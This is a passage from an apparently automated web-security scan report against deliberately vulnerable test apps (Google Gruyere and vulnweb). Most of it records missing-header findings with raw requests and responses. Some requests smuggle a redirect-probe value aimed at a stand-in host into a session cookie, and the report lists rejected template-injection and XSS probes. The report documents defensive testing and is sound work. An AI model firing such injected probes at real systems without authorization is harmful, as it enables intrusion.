    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/resetbutton as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F32] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/newsnippet.gtl (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-52e232d4 (exactly as issued by the engine) ---
  GET /530506698111053146050861906974275631884/newsnippet.gtl
  headers:
    Cookie: GRUYERE=59052512|//sentinel-redirect-check.example.org/probe||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 3156
    content-type: text/html
    date: Sat, 03 Oct 2026 01:35:07 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: c008081edc8aec9ba4edbefb9cf30177
    x-xss-protection: 0
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    <!-- Copyright 2017 Google Inc. -->
    <html>
    <head>
    <title>Gruyere: New Snippet</title>
    <style>
    /* Copyright 2017 Google Inc. */
    
    body, html, td, span, div, input, textarea {
      font-family: sans-serif;
      font-size: 14pt;
    }
    ... [162 more lines, 3154 chars total]
  elapsed_ms: 361.9
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/newsnippet.gtl as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F33] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/upload.gtl (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-f658e78f (exactly as issued by the engine) ---
  GET /530506698111053146050861906974275631884/upload.gtl
  headers:
    Cookie: GRUYERE=59052512|//sentinel-redirect-check.example.org/probe||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 3010
    content-type: text/html
    date: Sat, 03 Oct 2026 01:35:08 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 82f650a040226d904ecf3abfd8ecc478
    x-xss-protection: 0
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    <!-- Copyright 2017 Google Inc. -->
    <html>
    <head>
    <title>Gruyere: Upload</title>
    <style>
    /* Copyright 2017 Google Inc. */
    
    body, html, td, span, div, input, textarea {
      font-family: sans-serif;
      font-size: 14pt;
    }
    ... [156 more lines, 3009 chars total]
  elapsed_ms: 437.9
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/upload.gtl as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F34] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/editprofile.gtl (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-84380805 (exactly as issued by the engine) ---
  GET /530506698111053146050861906974275631884/editprofile.gtl
  headers:
    Cookie: GRUYERE=59052512|//sentinel-redirect-check.example.org/probe||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 4081
    content-type: text/html
    date: Sat, 03 Oct 2026 01:35:09 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 1a1f9749135f0baa72d108c13c17caaf
    x-xss-protection: 0
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    <!-- Copyright 2017 Google Inc. -->
    <html>
    <head>
    <title>Gruyere: Profile</title>
    <style>
    /* Copyright 2017 Google Inc. */
    
    body, html, td, span, div, input, textarea {
      font-family: sans-serif;
      font-size: 14pt;
    }
    ... [212 more lines, 4000 chars total]
  elapsed_ms: 370.4
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/editprofile.gtl as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F35] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/logout (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-26db739b (exactly as issued by the engine) ---
  GET /530506698111053146050861906974275631884/logout
  headers:
    Cookie: GRUYERE=59052512|//sentinel-redirect-check.example.org/probe||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 3524
    content-type: text/html
    date: Sat, 03 Oct 2026 01:35:10 GMT
    expires: Sat, 03 Oct 2026 01:35:10 GMT
    pragma: no-cache
    server: Google Frontend
    set-cookie: GRUYERE=; path=/530506698111053146050861906974275631884
    x-cloud-trace-context: 7632dd115a614018c11b34ec66b57fb4
    x-xss-protection: 0
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    <!-- Copyright 2017 Google Inc. -->
    <html>
    <head>
    <title>Gruyere: Home</title>
    <style>
    /* Copyright 2017 Google Inc. */
    
    body, html, td, span, div, input, textarea {
      font-family: sans-serif;
      font-size: 14pt;
    }
    ... [226 more lines, 3523 chars total]
  elapsed_ms: 335.1
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/logout as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F36] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/resetbutton/530506698111053146050861906974275631884 (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-3a1d22f6 (exactly as issued by the engine) ---
  GET /resetbutton/530506698111053146050861906974275631884
  headers:
    Cookie: GRUYERE=; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 657
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:35:10 GMT
    server: Google Frontend
    x-cloud-trace-context: 4f2bab41a8a336f49164d1f8833519a9
  body:
        <HTML>
        
      <STYLE>
      body, th, td, form {
        font-family: Verdana, Arial, Helvetica, sans-serif;
        font-size: 12px;
      }
      h1 { color: #dd0000; }
      </STYLE>
        <TITLE>Gruyere Reset Button</TITLE>
        <BODY>
        <H1>Gruyere Reset Button</H1>
    ... [14 more lines, 656 chars total]
  elapsed_ms: 232.1
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/resetbutton/530506698111053146050861906974275631884 as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

### rejected candidates (2 — engine-rejected; listed for transparency)
- ssti @ https://google-gruyere.appspot.com/530506698111053146050861906974275631884/snippets.gtl param `uid` — re-test:fresh-expression: fresh expression '{{12*11}}' -> 132 evaluated: False
- xss_reflected @ https://google-gruyere.appspot.com/530506698111053146050861906974275631884/saveprofile param `uid` — re-test:variant-battery-6: 0/6 diverse vectors reflected raw (WAF-resistant verification)

---

# TARGET: http://testphp.vulnweb.com  (testphp)

Authorization basis: Acunetix public test site (vulnweb.com) — explicitly provided for security testing.

**UNREACHABLE at scan time (2026-10-03, UTC):** DNS resolves (shared host 44.228.249.3) but TCP connects time out on both http and https; the other five targets responded from the same egress in the same window, so this is an outage of the target host, not of the scan environment. No scan was possible; recorded honestly.

(No findings. No packages. The engine never touched this target.)

---

# TARGET: http://testhtml5.vulnweb.com  (testhtml5)

Authorization basis: Acunetix public test site (vulnweb.com) — explicitly provided for security testing.

**UNREACHABLE at scan time (2026-10-03, UTC):** DNS resolves (shared host 44.228.249.3) but TCP connects time out on both http and https; the other five targets responded from the same egress in the same window, so this is an outage of the target host, not of the scan environment. No scan was possible; recorded honestly.

(No findings. No packages. The engine never touched this target.)


---

## Package totals
- findings packaged (raw, unadjudicated): 171
- targets scanned: 5 reachable | 2 unreachable (outage recorded above)
- This file was generated by scripts/build_verification_packages.py from
  build-v421/results/live_v421/*.json without any manual editing of the
  engine's records. The generator only formats; it never evaluates.
- Control bytes inside raw bodies are escaped as \xNN in this file for
  portability; the exact original bytes live in the committed scan JSONs
  (build-v421/results/live_v421/).
